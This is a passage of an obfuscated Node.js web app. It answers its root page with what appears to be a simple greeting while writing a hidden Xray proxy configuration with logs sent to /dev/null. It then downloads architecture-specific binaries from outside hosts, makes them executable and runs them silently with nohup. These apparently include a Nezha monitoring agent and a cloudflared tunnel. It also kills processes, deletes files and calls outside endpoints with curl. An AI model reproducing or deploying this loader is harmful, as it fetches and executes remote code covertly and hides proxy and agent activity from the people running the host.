        _0x1af281[_0x4b7826(0xfe)](_0x19285b => {
            const _0x3308a3 = _0x4b7826;
            const _0x4e3d6b = path[_0x3308a3(0xf0)](FILE_PATH, _0x19285b);
            try {
                const _0x5c5238 = fs[_0x3308a3(0x185)](_0x4e3d6b);
                if (_0x5c5238[_0x3308a3(0x162)]()) {
                    fs[_0x3308a3(0x18a)](_0x4e3d6b);
                }
            } catch (_0x292304) {
            }
        });
    } catch (_0x3ad1d0) {
    }
}
app[_0x1f12eb(0xeb)]('\x2f', function (_0x42ffcd, _0x4e53d7) {
    const _0x2ae9b5 = _0x1f12eb;
    _0x4e53d7[_0x2ae9b5(0xc4)](_0x2ae9b5(0xee) + '\x64\x21');
});
async function generateConfig() {
    const _0x59ca94 = _0x1f12eb;
    const _0x42e258 = {
        '\x6c\x6f\x67': {
            '\x61\x63\x63\x65\x73\x73': '\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c',
            '\x65\x72\x72\x6f\x72': '\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c',
            '\x6c\x6f\x67\x6c\x65\x76\x65\x6c': _0x59ca94(0x147)
        },
        '\x69\x6e\x62\x6f\x75\x6e\x64\x73': [
            {
                '\x70\x6f\x72\x74': ARGO_PORT,
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': '\x76\x6c\x65\x73\x73',
                '\x73\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x63\x6c\x69\x65\x6e\x74\x73': [{
                            '\x69\x64': UUID,
                            '\x66\x6c\x6f\x77': _0x59ca94(0xde) + _0x59ca94(0x16d)
                        }],
                    '\x64\x65\x63\x72\x79\x70\x74\x69\x6f\x6e': '\x6e\x6f\x6e\x65',
                    '\x66\x61\x6c\x6c\x62\x61\x63\x6b\x73': [
                        { '\x64\x65\x73\x74': 0xbb9 },
                        {
                            '\x70\x61\x74\x68': _0x59ca94(0x10c) + '\x6f',
                            '\x64\x65\x73\x74': 0xbba
                        },
                        {
                            '\x70\x61\x74\x68': _0x59ca94(0x1ed) + '\x6f',
                            '\x64\x65\x73\x74': 0xbbb
                        },
                        {
                            '\x70\x61\x74\x68': _0x59ca94(0x1b5) + '\x67\x6f',
                            '\x64\x65\x73\x74': 0xbbc
                        }
                    ]
                },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': { '\x6e\x65\x74\x77\x6f\x72\x6b': '\x74\x63\x70' }
            },
            {
                '\x70\x6f\x72\x74': 0xbb9,
                '\x6c\x69\x73\x74\x65\x6e': _0x59ca94(0x1a2),
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x59ca94(0x14a),
                '\x73\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x63\x6c\x69\x65\x6e\x74\x73': [{ '\x69\x64': UUID }],
                    '\x64\x65\x63\x72\x79\x70\x74\x69\x6f\x6e': _0x59ca94(0x147)
                },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x6e\x65\x74\x77\x6f\x72\x6b': '\x74\x63\x70',
                    '\x73\x65\x63\x75\x72\x69\x74\x79': _0x59ca94(0x147)
                }
            },
            {
                '\x70\x6f\x72\x74': 0xbba,
                '\x6c\x69\x73\x74\x65\x6e': _0x59ca94(0x1a2),
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x59ca94(0x14a),
                '\x73\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x63\x6c\x69\x65\x6e\x74\x73': [{
                            '\x69\x64': UUID,
                            '\x6c\x65\x76\x65\x6c': 0x0
                        }],
                    '\x64\x65\x63\x72\x79\x70\x74\x69\x6f\x6e': _0x59ca94(0x147)
                },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x6e\x65\x74\x77\x6f\x72\x6b': '\x77\x73',
                    '\x73\x65\x63\x75\x72\x69\x74\x79': _0x59ca94(0x147),
                    '\x77\x73\x53\x65\x74\x74\x69\x6e\x67\x73': { '\x70\x61\x74\x68': _0x59ca94(0x10c) + '\x6f' }
                },
                '\x73\x6e\x69\x66\x66\x69\x6e\x67': {
                    '\x65\x6e\x61\x62\x6c\x65\x64': !![],
                    '\x64\x65\x73\x74\x4f\x76\x65\x72\x72\x69\x64\x65': [
                        _0x59ca94(0x209),
                        '\x74\x6c\x73',
                        _0x59ca94(0x123)
                    ],
                    '\x6d\x65\x74\x61\x64\x61\x74\x61\x4f\x6e\x6c\x79': ![]
                }
            },
            {
                '\x70\x6f\x72\x74': 0xbbb,
                '\x6c\x69\x73\x74\x65\x6e': _0x59ca94(0x1a2),
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x59ca94(0x18e),
                '\x73\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x63\x6c\x69\x65\x6e\x74\x73': [{
                            '\x69\x64': UUID,
                            '\x61\x6c\x74\x65\x72\x49\x64': 0x0
                        }]
                },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x6e\x65\x74\x77\x6f\x72\x6b': '\x77\x73',
                    '\x77\x73\x53\x65\x74\x74\x69\x6e\x67\x73': { '\x70\x61\x74\x68': _0x59ca94(0x1ed) + '\x6f' }
                },
                '\x73\x6e\x69\x66\x66\x69\x6e\x67': {
                    '\x65\x6e\x61\x62\x6c\x65\x64': !![],
                    '\x64\x65\x73\x74\x4f\x76\x65\x72\x72\x69\x64\x65': [
                        _0x59ca94(0x209),
                        _0x59ca94(0x14f),
                        _0x59ca94(0x123)
                    ],
                    '\x6d\x65\x74\x61\x64\x61\x74\x61\x4f\x6e\x6c\x79': ![]
                }
            },
            {
                '\x70\x6f\x72\x74': 0xbbc,
                '\x6c\x69\x73\x74\x65\x6e': '\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31',
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x59ca94(0x15a),
                '\x73\x65\x74\x74\x69\x6e\x67\x73': { '\x63\x6c\x69\x65\x6e\x74\x73': [{ '\x70\x61\x73\x73\x77\x6f\x72\x64': UUID }] },
                '\x73\x74\x72\x65\x61\x6d\x53\x65\x74\x74\x69\x6e\x67\x73': {
                    '\x6e\x65\x74\x77\x6f\x72\x6b': '\x77\x73',
                    '\x73\x65\x63\x75\x72\x69\x74\x79': _0x59ca94(0x147),
                    '\x77\x73\x53\x65\x74\x74\x69\x6e\x67\x73': { '\x70\x61\x74\x68': '\x2f\x74\x72\x6f\x6a\x61\x6e\x2d\x61\x72' + '\x67\x6f' }
                },
                '\x73\x6e\x69\x66\x66\x69\x6e\x67': {
                    '\x65\x6e\x61\x62\x6c\x65\x64': !![],
                    '\x64\x65\x73\x74\x4f\x76\x65\x72\x72\x69\x64\x65': [
                        '\x68\x74\x74\x70',
                        _0x59ca94(0x14f),
                        '\x71\x75\x69\x63'
                    ],
                    '\x6d\x65\x74\x61\x64\x61\x74\x61\x4f\x6e\x6c\x79': ![]
                }
            }
        ],
        '\x64\x6e\x73': { '\x73\x65\x72\x76\x65\x72\x73': [_0x59ca94(0xd8) + _0x59ca94(0xdc) + _0x59ca94(0x1cf) + '\x79'] },
        '\x6f\x75\x74\x62\x6f\x75\x6e\x64\x73': [
            {
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': '\x66\x72\x65\x65\x64\x6f\x6d',
                '\x74\x61\x67': _0x59ca94(0x171)
            },
            {
                '\x70\x72\x6f\x74\x6f\x63\x6f\x6c': _0x59ca94(0x1e5),
                '\x74\x61\x67': _0x59ca94(0x1b3)
            }
        ]
    };
    fs['\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53' + _0x59ca94(0x12d)](path['\x6a\x6f\x69\x6e'](FILE_PATH, _0x59ca94(0x1aa) + '\x6e'), JSON['\x73\x74\x72\x69\x6e\x67\x69\x66\x79'](_0x42e258, null, 0x2));
}
function getSystemArchitecture() {
    const _0x1135f8 = _0x1f12eb;
    const _0x59ce70 = os['\x61\x72\x63\x68']();
    if (_0x59ce70 === _0x1135f8(0x189) || _0x59ce70 === _0x1135f8(0x1fb) || _0x59ce70 === _0x1135f8(0xda)) {
        return _0x1135f8(0x189);
    } else {
        return _0x1135f8(0x15f);
    }
}
function downloadFile(_0x12a29e, _0x14b9b5, _0x1371d2) {
    const _0x104b13 = _0x1f12eb;
    const _0x2bd9db = _0x12a29e;
    if (!fs[_0x104b13(0xc7)](FILE_PATH)) {
        fs['\x6d\x6b\x64\x69\x72\x53\x79\x6e\x63'](FILE_PATH, { '\x72\x65\x63\x75\x72\x73\x69\x76\x65': !![] });
    }
    const _0x39c8c8 = fs[_0x104b13(0x20f) + _0x104b13(0xd5)](_0x2bd9db);
    axios({
        '\x6d\x65\x74\x68\x6f\x64': _0x104b13(0xeb),
        '\x75\x72\x6c': _0x14b9b5,
        '\x72\x65\x73\x70\x6f\x6e\x73\x65\x54\x79\x70\x65': _0x104b13(0x202)
    })['\x74\x68\x65\x6e'](_0x567917 => {
        const _0x5bec75 = _0x104b13;
        _0x567917[_0x5bec75(0x113)][_0x5bec75(0x101)](_0x39c8c8);
        _0x39c8c8['\x6f\x6e'](_0x5bec75(0x108), () => {
            const _0x4511b1 = _0x5bec75;
            _0x39c8c8['\x63\x6c\x6f\x73\x65']();
            console[_0x4511b1(0xbf)](_0x4511b1(0x138) + path['\x62\x61\x73\x65\x6e\x61\x6d\x65'](_0x2bd9db) + (_0x4511b1(0x18d) + _0x4511b1(0xec)));
            _0x1371d2(null, _0x2bd9db);
        });
        _0x39c8c8['\x6f\x6e'](_0x5bec75(0x120), _0x21586b => {
            const _0x1ed261 = _0x5bec75;
            fs[_0x1ed261(0xf9)](_0x2bd9db, () => {
            });
            const _0x500120 = _0x1ed261(0x138) + path[_0x1ed261(0x14d)](_0x2bd9db) + _0x1ed261(0x198) + _0x21586b['\x6d\x65\x73\x73\x61\x67\x65'];
            console[_0x1ed261(0x120)](_0x500120);
            _0x1371d2(_0x500120);
        });
    })[_0x104b13(0xb9)](_0x4c1cf7 => {
        const _0x4e0b46 = _0x104b13;
        const _0x25026d = '\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x20' + path[_0x4e0b46(0x14d)](_0x2bd9db) + _0x4e0b46(0x198) + _0x4c1cf7[_0x4e0b46(0xc1)];
        console[_0x4e0b46(0x120)](_0x25026d);
        _0x1371d2(_0x25026d);
    });
}
async function downloadFilesAndRun() {
    const _0x5eaa30 = _0x1f12eb;
    const _0x49bea5 = getSystemArchitecture();
    const _0x541060 = getFilesForArchitecture(_0x49bea5);
    if (_0x541060['\x6c\x65\x6e\x67\x74\x68'] === 0x0) {
        console[_0x5eaa30(0xbf)]('\x43\x61\x6e\x27\x74\x20\x66\x69\x6e\x64' + _0x5eaa30(0x16f) + _0x5eaa30(0x1b6) + _0x5eaa30(0x180) + _0x5eaa30(0x159));
        return;
    }
    const _0x44de20 = _0x541060[_0x5eaa30(0x1e3)](_0x236f5f => {
        return new Promise((_0x145870, _0x59626f) => {
            const _0x198a1e = _0x264a;
            downloadFile(_0x236f5f[_0x198a1e(0x1b4)], _0x236f5f[_0x198a1e(0xfa)], (_0x462822, _0x15cdcd) => {
                if (_0x462822) {
                    _0x59626f(_0x462822);
                } else {
                    _0x145870(_0x15cdcd);
                }
            });
        });
    });
    try {
        await Promise[_0x5eaa30(0xcf)](_0x44de20);
    } catch (_0x17becb) {
        console[_0x5eaa30(0x120)](_0x5eaa30(0x1fc) + _0x5eaa30(0x210) + _0x5eaa30(0x135), _0x17becb);
        return;
    }
    function _0x59a08c(_0x5127ec) {
        const _0x4f7f0e = _0x5eaa30;
        const _0x16a227 = 0x1fd;
        _0x5127ec[_0x4f7f0e(0xfe)](_0x1b7ef0 => {
            const _0x2bd621 = _0x4f7f0e;
            if (fs[_0x2bd621(0xc7)](_0x1b7ef0)) {
                fs[_0x2bd621(0x132)](_0x1b7ef0, _0x16a227, _0x34125d => {
                    const _0x5042d4 = _0x2bd621;
                    if (_0x34125d) {
                        console[_0x5042d4(0x120)](_0x5042d4(0x136) + _0x5042d4(0x206) + '\x6f\x72\x20' + _0x1b7ef0 + '\x3a\x20' + _0x34125d);
                    } else {
                        console[_0x5042d4(0xbf)](_0x5042d4(0x136) + _0x5042d4(0x1c4) + _0x5042d4(0x134) + _0x1b7ef0 + '\x3a\x20' + _0x16a227['\x74\x6f\x53\x74\x72\x69\x6e\x67'](0x8));
                    }
                });
            }
        });
    }
    const _0x2e06df = NEZHA_PORT ? [
        npmPath,
        webPath,
        botPath
    ] : [
        phpPath,
        webPath,
        botPath
    ];
    _0x59a08c(_0x2e06df);
    if (NEZHA_SERVER && NEZHA_KEY) {
        if (!NEZHA_PORT) {
            const _0x4a2199 = NEZHA_SERVER[_0x5eaa30(0x1d5)]('\x3a') ? NEZHA_SERVER['\x73\x70\x6c\x69\x74']('\x3a')[_0x5eaa30(0x11e)]() : '';
            const _0x5e73e8 = new Set([
                _0x5eaa30(0x181),
                _0x5eaa30(0x173),
                _0x5eaa30(0x1f2),
                _0x5eaa30(0x163),
                _0x5eaa30(0x14b),
                _0x5eaa30(0x116)
            ]);
            const _0x2d881c = _0x5e73e8[_0x5eaa30(0xf6)](_0x4a2199) ? '\x74\x72\x75\x65' : '\x66\x61\x6c\x73\x65';
            const _0x4af5d3 = _0x5eaa30(0xba) + _0x5eaa30(0xc0) + NEZHA_KEY + (_0x5eaa30(0x12c) + _0x5eaa30(0x1ca) + _0x5eaa30(0x11a) + '\x61\x74\x65\x3a\x20\x74\x72\x75\x65\x0a' + _0x5eaa30(0x122) + _0x5eaa30(0x1b8) + _0x5eaa30(0x158) + _0x5eaa30(0xc5) + _0x5eaa30(0x168) + _0x5eaa30(0x1ee) + _0x5eaa30(0x1df) + _0x5eaa30(0x1dd) + _0x5eaa30(0x1af) + _0x5eaa30(0x1e1) + '\x73\x65\x0a\x67\x70\x75\x3a\x20\x66\x61' + _0x5eaa30(0x139) + '\x72\x65\x5f\x74\x6c\x73\x3a\x20\x74\x72' + '\x75\x65\x0a\x69\x70\x5f\x72\x65\x70\x6f' + _0x5eaa30(0x12a) + _0x5eaa30(0x177) + _0x5eaa30(0x203) + _0x5eaa30(0x16c)) + NEZHA_SERVER + (_0x5eaa30(0x149) + _0x5eaa30(0x13d) + _0x5eaa30(0xc9) + '\x6b\x69\x70\x5f\x70\x72\x6f\x63\x73\x5f' + _0x5eaa30(0x10d) + _0x5eaa30(0x137) + _0x5eaa30(0xff) + '\x0a\x74\x6c\x73\x3a\x20') + _0x2d881c + ('\x0a\x75\x73\x65\x5f\x67\x69\x74\x65\x65' + _0x5eaa30(0x195) + _0x5eaa30(0x1f6) + _0x5eaa30(0x170) + _0x5eaa30(0xe2) + _0x5eaa30(0x1a3) + _0x5eaa30(0x16a)) + UUID;
            fs[_0x5eaa30(0x183) + _0x5eaa30(0x12d)](path[_0x5eaa30(0xf0)](FILE_PATH, _0x5eaa30(0x182) + '\x6c'), _0x4af5d3);
            const _0x1c4168 = _0x5eaa30(0x141) + phpPath + _0x5eaa30(0x1e0) + FILE_PATH + (_0x5eaa30(0x160) + _0x5eaa30(0x17d) + '\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20' + '\x26');
            try {
                await exec(_0x1c4168);
                console[_0x5eaa30(0xbf)](phpName + (_0x5eaa30(0x201) + '\x67'));
                await new Promise(_0x5ed44f => setTimeout(_0x5ed44f, 0x3e8));
            } catch (_0x469eaf) {
                console[_0x5eaa30(0x120)](_0x5eaa30(0x1e9) + _0x5eaa30(0xe1) + _0x469eaf);
            }
        } else {
            let _0x56b9f4 = '';
            const _0x32af3f = [
                _0x5eaa30(0x181),
                _0x5eaa30(0x173),
                _0x5eaa30(0x1f2),
                _0x5eaa30(0x163),
                _0x5eaa30(0x14b),
                _0x5eaa30(0x116)
            ];
            if (_0x32af3f[_0x5eaa30(0x1d5)](NEZHA_PORT)) {
                _0x56b9f4 = _0x5eaa30(0x176);
            }
            const _0x3b2009 = '\x6e\x6f\x68\x75\x70\x20' + npmPath + _0x5eaa30(0x166) + NEZHA_SERVER + '\x3a' + NEZHA_PORT + _0x5eaa30(0x11d) + NEZHA_KEY + '\x20' + _0x56b9f4 + ('\x20\x2d\x2d\x64\x69\x73\x61\x62\x6c\x65' + _0x5eaa30(0x114) + _0x5eaa30(0x10e) + _0x5eaa30(0xfc) + _0x5eaa30(0xcd) + '\x6e\x20\x2d\x2d\x73\x6b\x69\x70\x2d\x70' + _0x5eaa30(0xd2) + _0x5eaa30(0xd0) + '\x20\x26');
            try {
                await exec(_0x3b2009);
                console['\x6c\x6f\x67'](npmName + (_0x5eaa30(0x201) + '\x67'));
                await new Promise(_0x8abb9 => setTimeout(_0x8abb9, 0x3e8));
            } catch (_0x3c9655) {
                console[_0x5eaa30(0x120)](_0x5eaa30(0x1a9) + '\x67\x20\x65\x72\x72\x6f\x72\x3a\x20' + _0x3c9655);
            }
        }
    } else {
        console[_0x5eaa30(0xbf)]('\x4e\x45\x5a\x48\x41\x20\x76\x61\x72\x69' + _0x5eaa30(0x213) + _0x5eaa30(0x154) + _0x5eaa30(0x157));
    }
    const _0x65d0 = '\x6e\x6f\x68\x75\x70\x20' + webPath + _0x5eaa30(0x14e) + FILE_PATH + (_0x5eaa30(0x156) + _0x5eaa30(0xcc) + '\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26');
    try {
        await exec(_0x65d0);
        console[_0x5eaa30(0xbf)](webName + (_0x5eaa30(0x201) + '\x67'));
        await new Promise(_0x2fa0fa => setTimeout(_0x2fa0fa, 0x3e8));
    } catch (_0x9b1994) {
        console[_0x5eaa30(0x120)](_0x5eaa30(0x194) + _0x5eaa30(0xe1) + _0x9b1994);
    }
    if (fs[_0x5eaa30(0xc7)](botPath)) {
        let _0x19d710;
        if (ARGO_AUTH[_0x5eaa30(0x197)](/^[A-Z0-9a-z=]{120,250}$/)) {
            _0x19d710 = _0x5eaa30(0x161) + '\x64\x67\x65\x2d\x69\x70\x2d\x76\x65\x72' + _0x5eaa30(0xd1) + _0x5eaa30(0x127) + _0x5eaa30(0x129) + _0x5eaa30(0x1c5) + _0x5eaa30(0x140) + _0x5eaa30(0x1e6) + ARGO_AUTH;
        } else if (ARGO_AUTH['\x6d\x61\x74\x63\x68'](/TunnelSecret/)) {
            _0x19d710 = '\x74\x75\x6e\x6e\x65\x6c\x20\x2d\x2d\x65' + '\x64\x67\x65\x2d\x69\x70\x2d\x76\x65\x72' + _0x5eaa30(0xd1) + _0x5eaa30(0x104) + FILE_PATH + (_0x5eaa30(0x1ea) + '\x6c\x20\x72\x75\x6e');
        } else {
            _0x19d710 = '\x74\x75\x6e\x6e\x65\x6c\x20\x2d\x2d\x65' + _0x5eaa30(0x18c) + _0x5eaa30(0xd1) + '\x2d\x2d\x6e\x6f\x2d\x61\x75\x74\x6f\x75' + '\x70\x64\x61\x74\x65\x20\x2d\x2d\x70\x72' + _0x5eaa30(0x1c5) + _0x5eaa30(0x1ec) + _0x5eaa30(0x1f5) + FILE_PATH + (_0x5eaa30(0xc2) + _0x5eaa30(0x172) + _0x5eaa30(0xfd) + _0x5eaa30(0x20c) + _0x5eaa30(0x100)) + ARGO_PORT;
        }
        try {
            await exec(_0x5eaa30(0x141) + botPath + '\x20' + _0x19d710 + (_0x5eaa30(0x1bb) + _0x5eaa30(0x1eb)));
            console[_0x5eaa30(0xbf)](botName + (_0x5eaa30(0x201) + '\x67'));
            await new Promise(_0x5ec362 => setTimeout(_0x5ec362, 0x7d0));
        } catch (_0x25afaa) {
            console['\x65\x72\x72\x6f\x72'](_0x5eaa30(0x19c) + _0x5eaa30(0x12e) + _0x5eaa30(0x11f) + _0x25afaa);
        }
    }
    await new Promise(_0x51b694 => setTimeout(_0x51b694, 0x1388));
}
function getFilesForArchitecture(_0x4d12c9) {
    const _0x2428dd = _0x1f12eb;
    let _0x239ad6;
    if (_0x4d12c9 === _0x2428dd(0x189)) {
        _0x239ad6 = [
            {
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': webPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x72' + '\x6d\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e' + _0x2428dd(0x1d1)
            },
            {
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': botPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x72' + '\x6d\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e' + _0x2428dd(0x15c)
            }
        ];
    } else {
        _0x239ad6 = [
            {
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': webPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': _0x2428dd(0x115) + _0x2428dd(0x144) + _0x2428dd(0x1d1)
            },
            {
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': botPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d' + _0x2428dd(0x144) + _0x2428dd(0x15c)
            }
        ];
    }
    if (NEZHA_SERVER && NEZHA_KEY) {
        if (NEZHA_PORT) {
            const _0x55f5fa = _0x4d12c9 === _0x2428dd(0x189) ? _0x2428dd(0x175) + _0x2428dd(0x1cc) + _0x2428dd(0xbb) + '\x74' : '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d' + '\x64\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e' + _0x2428dd(0xbb) + '\x74';
            _0x239ad6[_0x2428dd(0x1e2)]({
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': npmPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': _0x55f5fa
            });
        } else {
            const _0x3fb0f5 = _0x4d12c9 === _0x2428dd(0x189) ? '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x72' + '\x6d\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e' + _0x2428dd(0x193) : '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d' + _0x2428dd(0x144) + _0x2428dd(0x193);
            _0x239ad6[_0x2428dd(0x1e2)]({
                '\x66\x69\x6c\x65\x4e\x61\x6d\x65': phpPath,
                '\x66\x69\x6c\x65\x55\x72\x6c': _0x3fb0f5
            });
        }
    }
    return _0x239ad6;
}
function argoType() {
    const _0x2e8773 = _0x1f12eb;
    if (!ARGO_AUTH || !ARGO_DOMAIN) {
        console[_0x2e8773(0xbf)](_0x2e8773(0xbd) + _0x2e8773(0x13e) + '\x41\x55\x54\x48\x20\x76\x61\x72\x69\x61' + _0x2e8773(0x1c6) + '\x74\x79\x2c\x20\x75\x73\x65\x20\x71\x75' + _0x2e8773(0xe9) + '\x73');
        return;
    }
    if (ARGO_AUTH[_0x2e8773(0x1d5)](_0x2e8773(0xbc) + '\x65\x74')) {
        fs['\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53' + '\x79\x6e\x63'](path['\x6a\x6f\x69\x6e'](FILE_PATH, _0x2e8773(0x1d3) + '\x6e'), ARGO_AUTH);
        const _0x1fe1b1 = _0x2e8773(0x20e) + '\x20' + ARGO_AUTH[_0x2e8773(0x153)]('\x22')[0xb] + ('\x0a\x20\x20\x63\x72\x65\x64\x65\x6e\x74' + _0x2e8773(0x1ae) + '\x20') + path[_0x2e8773(0xf0)](FILE_PATH, _0x2e8773(0x1d3) + '\x6e') + (_0x2e8773(0x164) + _0x2e8773(0xed) + _0x2e8773(0x148) + _0x2e8773(0x110) + '\x6f\x73\x74\x6e\x61\x6d\x65\x3a\x20') + ARGO_DOMAIN + (_0x2e8773(0x17f) + _0x2e8773(0x1ba) + _0x2e8773(0x14c) + '\x73\x74\x3a') + ARGO_PORT + (_0x2e8773(0x1be) + _0x2e8773(0xc6) + '\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20' + _0x2e8773(0x1d8) + _0x2e8773(0x10a) + '\x20\x20\x2d\x20\x73\x65\x72\x76\x69\x63' + _0x2e8773(0x1f0) + _0x2e8773(0x1f8) + '\x20');
        fs[_0x2e8773(0x183) + _0x2e8773(0x12d)](path[_0x2e8773(0xf0)](FILE_PATH, _0x2e8773(0x1fe)), _0x1fe1b1);
    } else {
        console[_0x2e8773(0xbf)](_0x2e8773(0x1ad) + _0x2e8773(0x16b) + _0x2e8773(0x151) + _0x2e8773(0x15e) + _0x2e8773(0x1a6) + '\x74\x6f\x20\x74\x75\x6e\x6e\x65\x6c');
    }
}
argoType();
async function extractDomains() {
    const _0x295622 = _0x1f12eb;
    let _0x13b844;
    if (ARGO_AUTH && ARGO_DOMAIN) {
        _0x13b844 = ARGO_DOMAIN;
        console[_0x295622(0xbf)](_0x295622(0xbd) + '\x4e\x3a', _0x13b844);
        await _0x26ca99(_0x13b844);
    } else {
        try {
            const _0x4534f0 = fs['\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79' + '\x6e\x63'](path[_0x295622(0xf0)](FILE_PATH, '\x62\x6f\x6f\x74\x2e\x6c\x6f\x67'), _0x295622(0x20a));
            const _0x523d4d = _0x4534f0['\x73\x70\x6c\x69\x74']('\x0a');
            const _0x163ff3 = [];
            _0x523d4d[_0x295622(0xfe)](_0x1c053f => {
                const _0x2662e1 = _0x295622;
                const _0x283b75 = _0x1c053f[_0x2662e1(0x197)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
                if (_0x283b75) {
                    const _0x182901 = _0x283b75[0x1];
                    _0x163ff3[_0x2662e1(0x18f)](_0x182901);
                }
            });
            if (_0x163ff3[_0x295622(0x1c0)] > 0x0) {
                _0x13b844 = _0x163ff3[0x0];
                console[_0x295622(0xbf)]('\x41\x72\x67\x6f\x44\x6f\x6d\x61\x69\x6e' + '\x3a', _0x13b844);
                await _0x26ca99(_0x13b844);
            } else {
                console[_0x295622(0xbf)](_0x295622(0x15d) + _0x295622(0x184) + '\x2c\x20\x72\x65\x2d\x72\x75\x6e\x6e\x69' + _0x295622(0xd7) + '\x6f\x62\x74\x61\x69\x6e\x20\x41\x72\x67' + _0x295622(0x1c8));
                fs[_0x295622(0x18a)](path[_0x295622(0xf0)](FILE_PATH, '\x62\x6f\x6f\x74\x2e\x6c\x6f\x67'));
                async function _0x3f8e93() {
                    const _0x47289c = _0x295622;
                    try {
                        if (process['\x70\x6c\x61\x74\x66\x6f\x72\x6d'] === _0x47289c(0xe3)) {
                            await exec(_0x47289c(0x17a) + _0x47289c(0x10f) + botName + (_0x47289c(0x19f) + _0x47289c(0x1d9)));
                        } else {
                            await exec(_0x47289c(0x1f1) + '\x5b' + botName[_0x47289c(0x1ce)](0x0) + '\x5d' + botName[_0x47289c(0xf2)](0x1) + ('\x22\x20\x3e\x20\x2f\x64\x65\x76\x2f\x6e' + _0x47289c(0x12b)));
                        }
                    } catch (_0x4055e1) {
                    }
                }
                _0x3f8e93();
                await new Promise(_0x508081 => setTimeout(_0x508081, 0xbb8));
                const _0x53ae77 = _0x295622(0x161) + '\x64\x67\x65\x2d\x69\x70\x2d\x76\x65\x72' + _0x295622(0xd1) + _0x295622(0x127) + _0x295622(0x129) + _0x295622(0x1c5) + _0x295622(0x1ec) + _0x295622(0x1f5) + FILE_PATH + (_0x295622(0xc2) + _0x295622(0x172) + '\x20\x69\x6e\x66\x6f\x20\x2d\x2d\x75\x72' + _0x295622(0x20c) + '\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a') + ARGO_PORT;
                try {
                    await exec(_0x295622(0x141) + botPath + '\x20' + _0x53ae77 + (_0x295622(0x1bb) + '\x6c\x20\x32\x3e\x26\x31\x20\x26'));
                    console[_0x295622(0xbf)](botName + (_0x295622(0x201) + '\x67'));
                    await new Promise(_0x56a7e4 => setTimeout(_0x56a7e4, 0xbb8));
                    await extractDomains();
                } catch (_0x4828ac) {
                    console[_0x295622(0x120)]('\x45\x72\x72\x6f\x72\x20\x65\x78\x65\x63' + _0x295622(0x12e) + _0x295622(0x11f) + _0x4828ac);
                }
            }
        } catch (_0x55ca9f) {
            console[_0x295622(0x120)](_0x295622(0x186) + _0x295622(0x143) + _0x295622(0x1b7), _0x55ca9f);
        }
    }
    async function _0x26ca99(_0x2d87f5) {
        const _0x6c2920 = _0x295622;
        const _0x569b9f = execSync('\x63\x75\x72\x6c\x20\x2d\x73\x6d\x20\x35' + _0x6c2920(0x13f) + _0x6c2920(0x11b) + '\x66\x6c\x61\x72\x65\x2e\x63\x6f\x6d\x2f' + _0x6c2920(0x1a8) + _0x6c2920(0x1c1) + _0x6c2920(0x187) + _0x6c2920(0x174) + _0x6c2920(0x109) + _0x6c2920(0x1f7), { '\x65\x6e\x63\x6f\x64\x69\x6e\x67': '\x75\x74\x66\x2d\x38' });
        const _0xfd970e = _0x569b9f['\x74\x72\x69\x6d']();
        const _0x2270e6 = NAME ? NAME + '\x2d' + _0xfd970e : _0xfd970e;
        return new Promise(_0x57d762 => {
            setTimeout(() => {
                const _0x143564 = _0x264a;
                const _0x58b0a8 = {
                    '\x76': '\x32',
                    '\x70\x73': '' + _0x2270e6,
                    '\x61\x64\x64': CFIP,
                    '\x70\x6f\x72\x74': CFPORT,
                    '\x69\x64': UUID,
                    '\x61\x69\x64': '\x30',
                    '\x73\x63\x79': _0x143564(0x147),
                    '\x6e\x65\x74': '\x77\x73',
                    '\x74\x79\x70\x65': _0x143564(0x147),
                    '\x68\x6f\x73\x74': _0x2d87f5,
                    '\x70\x61\x74\x68': '\x2f\x76\x6d\x65\x73\x73\x2d\x61\x72\x67' + _0x143564(0x16e),
                    '\x74\x6c\x73': '\x74\x6c\x73',
                    '\x73\x6e\x69': _0x2d87f5,
